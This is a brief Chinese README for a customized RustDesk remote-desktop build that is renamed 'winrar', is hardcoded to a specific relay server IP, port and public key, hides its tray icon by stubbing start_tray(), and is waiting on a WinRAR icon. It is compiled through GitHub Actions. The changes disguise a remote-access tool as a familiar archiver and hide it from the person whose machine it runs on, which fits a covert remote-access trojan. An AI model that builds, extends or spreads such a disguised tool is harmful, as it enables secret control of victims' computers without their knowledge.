# WinRAR RustDesk 定制版 (v1)

## 修改内容
1. **程序名称**: rustdesk → winrar
2. **服务器配置**: 
   - ID服务器: 103.40.14.14:33973
   - 中继端口: 21117
   - WS中继端口: 21119
   - 公钥: QXjGQibEKuQDg4QGfJpd1BPwJl4XcVoQO1B+KG+rBK0=
3. **托盘图标**: 已隐藏 (src/tray.rs 中 start_tray() 直接返回)
4. **Rust版本**: 锁定 1.75 (确保 sciter 兼容)

## 待完成
- [ ] 替换图标文件 (需要用户提供 winrar.ico)

## 编译方式
通过 GitHub Actions CI 自动编译 Windows x64 版本
